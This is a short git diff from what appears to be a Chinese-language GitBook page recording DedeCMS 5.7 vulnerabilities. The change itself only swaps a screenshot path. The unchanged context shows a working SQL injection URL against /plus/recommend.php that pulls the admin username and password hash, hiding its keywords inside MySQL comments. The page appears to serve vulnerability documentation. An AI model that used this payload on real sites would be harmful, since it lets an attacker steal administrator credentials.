@@ -20,7 +20,7 @@ description: 记录DedeCMS5.7漏洞信息
 /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` limit+0,1),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111
 ```
 
-![&#x6F0F;&#x6D1E;&#x8868;&#x73B0;](../.gitbook/assets/image%20%2870%29.png)
+![&#x6F0F;&#x6D1E;&#x8868;&#x73B0;](../.gitbook/assets/image%20%2871%29.png)
 
 ## 漏洞分析
 
